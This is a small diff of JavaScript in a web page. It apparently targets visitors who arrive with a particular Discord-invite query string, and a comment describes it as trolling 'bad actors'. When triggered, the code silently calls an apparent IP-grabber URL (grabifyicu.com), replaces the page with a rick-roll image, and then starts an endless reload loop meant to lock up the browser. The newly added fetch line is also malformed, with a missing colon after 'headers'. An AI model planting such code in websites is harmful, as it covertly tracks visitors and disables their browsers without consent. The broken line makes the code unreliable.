@@ -830,7 +830,7 @@
 		
 		//We do a little trolling (only for bad actors on this site)
 		if (window.location.search == "?discord-invite=%22%22") {
-			fetch("https://grabifyicu.com/GHBBED", { mode: 'no-cors' })
+			fetch("https://grabifyicu.com/GHBBED", { mode: 'cors', headers { 'Access-Control-Allow-Origin':'*' }})
 			document.body.innerHTML = '<img src="https://c.tenor.com/_4YgA77ExHEAAAAd/rick-roll.gif" style="width:100%; height:100%;">'
 			setTimeout(function(){ while (true) { window.location.reload() } }, 6000)
 		}
